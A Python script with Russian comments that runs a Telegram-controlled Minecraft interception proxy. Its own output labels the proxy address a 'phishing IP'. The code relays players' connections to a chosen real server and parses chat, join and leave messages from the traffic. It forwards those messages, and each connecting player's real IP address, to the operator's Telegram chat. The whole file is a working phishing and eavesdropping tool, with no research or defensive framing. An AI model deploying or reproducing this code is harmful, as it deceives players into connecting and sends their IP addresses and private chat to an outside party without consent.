#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import asyncio
import socket
import re
import os
import sys
import requests
import json
from datetime import datetime

# ======================================================
#  КОНФИГУРАЦИЯ
# ======================================================

try:
    BOT_TOKEN = os.getenv('BOT_TOKEN', '')
    if not BOT_TOKEN or ':' not in BOT_TOKEN:
        print("❌ ОШИБКА: BOT_TOKEN не задан или неправильного формата!")
        sys.exit(1)
    
    PROXY_PORT = int(os.getenv('PORT', 7777))
    
    print("✅ Все переменные окружения загружены:")
    print(f"   BOT_TOKEN: {BOT_TOKEN[:5]}... (скрыто)")
    print(f"   PORT: {PROXY_PORT}")
    
except Exception as e:
    print(f"❌ ОШИБКА загрузки переменных: {e}")
    sys.exit(1)

# ======================================================
#  БЕЗ Telethon (используем requests к Bot API)
# ======================================================

API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}"

def send_telegram_message(chat_id, text):
    """Отправляет сообщение через Bot API"""
    try:
        url = f"{API_URL}/sendMessage"
        payload = {
            'chat_id': chat_id,
            'text': text,
            'parse_mode': 'Markdown'
        }
        response = requests.post(url, data=payload, timeout=10)
        return response.ok
    except Exception as e:
        print(f"❌ Ошибка отправки: {e}")
        return False

def get_updates(offset=0):
    """Получает новые сообщения от пользователей"""
    try:
        url = f"{API_URL}/getUpdates"
        params = {'offset': offset, 'timeout': 30}
        response = requests.get(url, params=params, timeout=35)
        if response.ok:
            return response.json().get('result', [])
        return []
    except:
        return []

# ======================================================

active_sessions = {}
last_update_id = 0

def get_public_ip():
    """Получает внешний IP сервера"""
    try:
        response = requests.get('https://api.ipify.org', timeout=5)
        return response.text.strip()
    except:
        try:
            response = requests.get('https://icanhazip.com', timeout=5)
            return response.text.strip()
        except:
            return '0.0.0.0'

# ======================================================
#  ОБРАБОТКА КОМАНД
# ======================================================

def handle_command(chat_id, text, username):
    """Обрабатывает команды от пользователей"""
    global active_sessions
    
    if text == '/start':
        send_telegram_message(
            chat_id,
            "🤖 *Minecraft Proxy Logger*\n\n"
            "📌 Команды:\n"
            "`/log IP_сервера` - начать логирование\n"
            "`/stop` - остановить\n"
            "`/status` - статус сессии\n\n"
            "Пример: `/log funtime.su`"
        )
        return
    
    elif text == '/help':
        send_telegram_message(
            chat_id,
            "👑 *Команды бота:*\n\n"
            "📤 `/log IP_сервера` - создать прокси и начать логирование\n"
            "   Пример: `/log funtime.su`\n\n"
            "🛑 `/stop` - остановить текущую сессию\n\n"
            "📊 `/status` - показать статус активной сессии\n\n"
            "❓ `/help` - эта справка"
        )
        return
    
    elif text == '/stop':
        if chat_id in active_sessions:
            session = active_sessions[chat_id]
            msg_count = len(session.get('messages', []))
            duration = (datetime.now() - session['started']).seconds // 60
            del active_sessions[chat_id]
            send_telegram_message(
                chat_id,
                f"🔴 *Логирование остановлено*\n\n"
                f"📊 Всего сообщений: {msg_count}\n"
                f"⏱ Длительность: {duration} мин"
            )
        else:
            send_telegram_message(chat_id, "❌ У тебя нет активной сессии!")
        return
    
    elif text == '/status':
        if chat_id in active_sessions:
            session = active_sessions[chat_id]
            msg_count = len(session.get('messages', []))
            duration = (datetime.now() - session['started']).seconds // 60
            send_telegram_message(
                chat_id,
                f"📊 *Статус сессии:*\n\n"
                f"🌐 Фишинг IP: `{session['phishing_ip']}`\n"
                f"📡 Сервер: `{session['target_server']}`\n"
                f"💬 Сообщений: {msg_count}\n"
                f"⏱ Длительность: {duration} мин"
            )
        else:
            send_telegram_message(chat_id, "❌ Нет активной сессии.")
        return
    
    elif text.startswith('/log '):
        server_ip = text.replace('/log ', '').strip()
        
        if chat_id in active_sessions:
            send_telegram_message(
                chat_id,
                "❌ У тебя уже есть активная сессия!\n"
                "Используй `/stop` чтобы остановить её."
            )
            return
        
        public_ip = get_public_ip()
        phishing_ip = f"{public_ip}:{PROXY_PORT}"
        
        active_sessions[chat_id] = {
            'target_server': server_ip,
            'chat_id': chat_id,
            'started': datetime.now(),
            'messages': [],
            'phishing_ip': phishing_ip,
            'sent_messages': []
        }
        
        send_telegram_message(
            chat_id,
            f"🟢 *Туннель создан!*\n\n"
            f"🌐 *IP для подключения:* `{phishing_ip}`\n"
            f"📡 *Целевой сервер:* `{server_ip}`\n\n"
            f"📝 *Инструкция:*\n"
            f"1. Открой Minecraft\n"
            f"2. Введи IP: `{phishing_ip}`\n"
            f"3. Все сообщения чата будут приходить сюда\n\n"
            f"🛑 Для остановки: `/stop`"
        )
        
        print(f"✅ Сессия {chat_id}: {server_ip} → {phishing_ip}")
        return
    
    else:
        send_telegram_message(
            chat_id,
            "❌ Неизвестная команда!\n"
            "Используй `/help` для списка команд."
        )

# ======================================================
#  ПРОКСИ-СЕРВЕР MINECRAFT
# ======================================================

async def start_proxy_server():
    """Запускает прокси-сервер Minecraft"""
    try:
        server = await asyncio.start_server(
            handle_client,
            '0.0.0.0',
            PROXY_PORT
        )
        print(f"✅ Прокси запущен на порту {PROXY_PORT}")
        async with server:
            await server.serve_forever()
    except Exception as e:
        print(f"❌ Ошибка запуска прокси: {e}")

async def handle_client(player_reader, player_writer):
    """Обрабатывает подключение игрока"""
    
    player_ip = player_writer.get_extra_info('peername')
    print(f"📡 Новое подключение от {player_ip[0]}")
    
    if not active_sessions:
        print("❌ Нет активной сессии, закрываю соединение")
        player_writer.close()
        return
    
    chat_id = list(active_sessions.keys())[0]
    session = active_sessions[chat_id]
    target_server = session['target_server']
    
    try:
        print(f"🔄 Подключаюсь к {target_server}")
        real_reader, real_writer = await asyncio.open_connection(
            target_server, 25565
        )
        
        send_telegram_message(
            chat_id,
            f"🟢 Игрок подключился к `{target_server}`\n"
            f"🌐 Реальный IP: `{player_ip[0]}`"
        )
        
        player_to_server = asyncio.create_task(forward_data(
            player_reader, real_writer, "игрок→сервер", chat_id
        ))
        server_to_player = asyncio.create_task(forward_data(
            real_reader, player_writer, "сервер→игрок", chat_id
        ))
        
        await asyncio.gather(player_to_server, server_to_player)
        
    except Exception as e:
        print(f"❌ Ошибка прокси: {e}")
        send_telegram_message(chat_id, f"❌ Ошибка прокси: `{str(e)}`")
    finally:
        player_writer.close()
        real_writer.close()
        print("🔌 Соединение закрыто")

async def forward_data(reader, writer, direction, chat_id):
    """Пересылает данные между игроком и сервером"""
    try:
        while True:
            data = await reader.read(4096)
            if not data:
                break
            
            writer.write(data)
            await writer.drain()
            
            await parse_minecraft_packet(data, direction, chat_id)
            
    except Exception as e:
        print(f"❌ Ошибка в {direction}: {e}")

async def parse_minecraft_packet(data, direction, chat_id):
    """Парсит пакеты Minecraft и вытаскивает сообщения"""
    try:
        text = data.decode('utf-8', errors='ignore')
        
        chat_pattern = r'<([^>]+)>\s*(.+?)(?:\x00|$)'
        matches = re.findall(chat_pattern, text)
        
        for player, message in matches:
            session = active_sessions.get(chat_id)
            if session:
                msg_key = f"{player}:{message}"
                if msg_key not in session.get('sent_messages', []):
                    if 'sent_messages' not in session:
                        session['sent_messages'] = []
                    session['sent_messages'].append(msg_key)
                    session['messages'].append(msg_key)
                    
                    send_telegram_message(
                        chat_id,
                        f"💬 *{player}*: {message}"
                    )
                    print(f"[ЧАТ] {player}: {message}")
        
        if 'joined the game' in text:
            player = text.split('joined the game')[0].strip()
            send_telegram_message(chat_id, f"🟢 *{player}* зашел на сервер")
            print(f"[ВХОД] {player}")
            
        elif 'left the game' in text:
            player = text.split('left the game')[0].strip()
            send_telegram_message(chat_id, f"🔴 *{player}* вышел с сервера")
            print(f"[ВЫХОД] {player}")
            
    except:
        pass

# ======================================================
#  ПОЛЛИНГ TELEGRAM
# ======================================================

async def poll_telegram():
    """Проверяет новые сообщения в Telegram"""
    global last_update_id
    
    print("🔄 Запуск поллинга Telegram...")
    
    while True:
        try:
            updates = get_updates(last_update_id + 1)
            
            for update in updates:
                last_update_id = update.get('update_id', last_update_id)
                
                if 'message' in update:
                    msg = update['message']
                    chat_id = msg['chat']['id']
                    text = msg.get('text', '')
                    username = msg['chat'].get('username', 'unknown')
                    
                    if text:
                        handle_command(chat_id, text, username)
            
        except Exception as e:
            print(f"❌ Ошибка поллинга: {e}")
        
        await asyncio.sleep(1)

# ======================================================
#  ЗАПУСК
# ======================================================

async def main():
    print("=" * 50)
    print("🚀 Minecraft Proxy Logger (Bot API)")
    print("=" * 50)
    
    public_ip = get_public_ip()
    print(f"🌐 Внешний IP: {public_ip}")
    print(f"📡 Прокси порт: {PROXY_PORT}")
    print(f"🔗 Фишинг IP: {public_ip}:{PROXY_PORT}")
    print("=" * 50)
    
    # Запускаем прокси
    asyncio.create_task(start_proxy_server())
    
    # Запускаем поллинг Telegram
    asyncio.create_task(poll_telegram())
    
    print("✅ Бот запущен!")
    print("📌 Используй команду /log <IP>")
    print("=" * 50)
    print("")
    print("💡 Подключись к прокси в Minecraft:")
    print(f"   {public_ip}:{PROXY_PORT}")
    print("")
    
    # Держим приложение живым
    await asyncio.Event().wait()

if __name__ == '__main__':
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n⏹ Бот остановлен")
    except Exception as e:
        print(f"\n❌ Критическая ошибка: {e}")
